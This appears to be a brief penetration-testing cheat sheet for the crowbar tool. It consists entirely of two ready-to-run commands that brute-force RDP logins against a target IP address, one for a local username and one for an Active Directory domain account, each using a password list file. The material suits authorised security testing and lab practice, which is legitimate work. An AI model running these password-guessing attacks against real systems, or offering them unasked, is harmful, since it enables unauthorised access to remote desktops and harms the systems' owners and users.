# crowbar

## brute force RDP
```bash
crowbar -b rdp -n 1 -s $IP/32 -u username -C ./passwords
```

### active directory domain joined
```
crowbar -b rdp -n 1 -s $IP/32 -u username@DOMAIN.local -C ./passwords
```
